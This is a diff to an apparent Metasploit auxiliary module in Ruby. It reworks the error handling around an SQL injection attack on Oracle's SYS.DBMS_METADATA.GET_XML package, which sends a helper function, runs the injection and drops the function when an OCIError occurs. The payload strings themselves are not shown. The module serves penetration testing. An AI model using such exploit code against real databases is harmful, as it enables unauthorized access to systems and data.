@@ -49,19 +49,15 @@ class Metasploit3 < Msf::Auxiliary
 
 		clean = "drop function #{name}"
 
-		begin
-			print_status("Sending function...")
-			prepare_exec(function)
-		rescue => e
-			return
+		print_status("Sending function...")
+		prepare_exec(function)
+
+		begin		
+			print_status("Attempting sql injection on SYS.DBMS_METADATA.GET_XML...")
+			prepare_exec(package)
+		rescue ::OCIError => e
+			print_status("Removing function '#{name}'...")
+			prepare_exec(clean)
 		end
-
-		print_status("Attempting sql injection on SYS.DBMS_METADATA.GET_XML...")
-		prepare_exec(package)
-
-		print_status("Removing function '#{name}'...")
-		prepare_exec(clean)
-
-	end
-
+	end	
 end
